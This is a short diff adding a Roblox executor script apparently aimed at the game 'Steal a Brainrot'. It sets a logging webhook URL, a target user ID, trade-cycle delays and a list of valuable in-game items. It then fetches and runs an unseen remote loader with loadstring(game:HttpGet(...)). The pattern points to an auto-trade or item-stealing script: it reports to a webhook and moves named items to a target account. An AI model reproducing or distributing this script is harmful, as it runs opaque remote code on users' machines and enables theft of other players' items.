@@ -1,0 +1,10 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_5352de199e1e4d73a0788a833df0120a"
+getgenv().TARGET_ID = 8719454780
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Lavadorito Spinito"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
